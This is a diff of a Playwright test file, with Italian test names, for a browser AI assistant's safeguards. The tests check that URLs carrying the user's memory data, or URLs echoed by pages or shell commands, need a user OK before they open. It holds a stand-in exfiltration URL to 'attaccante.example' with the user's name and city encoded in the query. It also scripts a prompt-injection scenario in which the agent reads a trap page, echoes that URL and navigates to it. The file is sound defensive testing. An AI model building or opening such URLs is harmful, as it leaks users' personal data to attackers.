@@ -257,9 +257,15 @@ test('dopo una ricerca, un indirizzo che il modello scrive coi dati della memori
   await expect(page.locator('.dash-bubble-actions .dash-action-btn-primary')).toHaveCount(1);
 });
 
-test('in una chat pulita la pagina che l\'utente chiede si apre anche se il suo indirizzo ha parole della memoria', async ({ app, openTab }) => {
+// Le parole della memoria nell'indirizzo lo portano a costo 2, che a Normale chiede un OK finché manca il guardiano
+// (#1840): un OK solo, e la pagina si apre senza una «conferma» da scrivere.
+test('in una chat pulita la pagina che l\'utente chiede si apre con un OK anche se il suo indirizzo ha parole della memoria', async ({ app, openTab }) => {
   test.setTimeout(60_000);
   const page = await openTab(NEWTAB);
+  await page.evaluate(() => {
+    window.__chiesto = [];
+    window.SN_CONFIRM_UI = { confirm: async (o) => { window.__chiesto.push(String((o && o.text) || '')); return true; }, confirmTyped: async () => false };
+  });
   await app.evaluate(() => globalThis.SN_FILO_MEMORY.setMemory({ PROFILO: 'Si chiama Mario Rossi, vive a Bologna nel quartiere Navile.', PREFERENZE: '' }));
   const url = 'https://www.comune.bologna.it/quartieri/navile';
   await stubModello(app, [
@@ -267,12 +273,17 @@ test('in una chat pulita la pagina che l\'utente chiede si apre anche se il suo 
     { finale: { cerca: '(x)', testo: 'FATTO.' } },
   ]);
   await chiedi(page, 'aprimi la pagina del quartiere Navile sul sito del comune di Bologna');
+  const bottone = page.locator('.dash-bubble-actions .dash-action-btn-primary');
+  await expect(bottone).toHaveCount(1, { timeout: 20_000 });
+  await bottone.click();
   await expect.poll(() => schedaVerso(app, 'comune.bologna.it'), { timeout: 20_000 }).toBe(true);
+  const chiesto = await page.evaluate(() => window.__chiesto);
+  expect(chiesto).toHaveLength(1);
+  expect(chiesto[0]).toContain('comune.bologna.it');
   await expect(page.locator('.dash-bubble-filo.dash-bubble-actions-only')).toBeVisible({ timeout: 20_000 });
   // Un'apertura riuscita parla da sé (#1130): il turno si chiude senza richiamare il modello.
   expect((await chiamate(app)).length).toBe(1);
   await expect(page.locator('.dash-bubble-filo', { hasText: 'FATTO.' })).toHaveCount(0);
-  await expect(page.locator('.dash-bubble-actions .dash-action-btn-primary')).toHaveCount(0);
 });
 
 // Il canale dei messaggi arriva anche ai content script dei siti: se quello strato cedesse, un sito non deve poter
@@ -944,6 +955,8 @@ test('dopo una pagina letta, un indirizzo scritto da Filo nella risposta resta s
 // Un indirizzo che il modello ha scritto resta suo anche quando una fonte lo ripete: la pagina dei risultati di una
 // ricerca che riporta le parole cercate, l'uscita di un comando (#553 giro 19).
 const RIPETUTO = 'https://attaccante.example/r?d=Znevb-Ebffv-Obybtan';
+// Il comando lo scrive senza schema: con lo schema è il comando stesso a chiedere l'OK, e non stampa niente (#2293).
+const STAMPA_RIPETUTO = `echo ${RIPETUTO.replace(/^https:\/\//, '')}`;
 async function siRipete(app) {
   await app.evaluate(() => {
     const prima = globalThis.SN_LETTURA_PAGINE._dip.scarica;
@@ -961,7 +974,7 @@ async function siRipete(app) {
 
 for (const [come, ripeti] of [
   ['dalla pagina dei risultati di una ricerca', { nome: 'LEGGI_PAGINA', args: { url: `https://it.wikipedia.org/w/index.php?search=${encodeURIComponent(RIPETUTO)}` } }],
-  ['dall\'uscita di un comando', { nome: 'ESEGUI_COMANDO', args: { comando: `echo ${RIPETUTO}` } }],
+  ['dall\'uscita di un comando', { nome: 'ESEGUI_COMANDO', args: { comando: STAMPA_RIPETUTO } }],
 ]) {
   test(`dopo una pagina letta, un indirizzo scritto dal modello e ripetuto ${come} chiede l'OK`, async ({ app, openTab }) => {
     test.setTimeout(60_000);
@@ -989,7 +1002,7 @@ test('dopo una pagina letta, un indirizzo fatto stampare a un comando non apre u
   await stubModello(app, [
     { strumenti: [{ nome: 'CERCA_WEB', args: { query: 'trattorie bologna' } }] },
     { strumenti: [{ nome: 'LEGGI_PAGINA', args: { url: 'https://trappola.example/trattorie' } }] },
-    { strumenti: [{ nome: 'ESEGUI_COMANDO', args: { comando: `echo ${RIPETUTO}` } }] },
+    { strumenti: [{ nome: 'ESEGUI_COMANDO', args: { comando: STAMPA_RIPETUTO } }] },
     { strumenti: [{ nome: 'NAVIGA', args: { url: RIPETUTO, background: true } }] },
     { finale: { cerca: '(x)', testo: 'FATTO.' } },
   ]);
